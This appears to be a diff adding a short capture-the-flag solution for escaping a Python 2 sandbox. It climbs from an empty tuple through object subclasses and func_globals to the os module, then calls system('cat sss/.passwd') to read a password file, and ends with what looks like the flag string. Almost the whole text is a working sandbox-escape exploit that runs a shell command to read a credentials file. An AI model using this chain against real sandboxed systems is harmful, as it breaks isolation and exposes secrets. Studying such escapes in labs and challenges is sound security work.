@@ -1,0 +1,11 @@
+oo = ().__class__.__bases__[0] --> object
+c = oo.__subclasses__()
+d = c[59].__init__
+e = d.__getattribute__
+f = e("func_globals")
+g = f["linecache"]
+h = g.__dict__['os']
+h.__dict__.keys().index("system") --> find "system"
+j = h.__dict__.values()[144] --> system
+j('cat sss/.passwd')
+PythonAlwaysHasAllYouNeed!
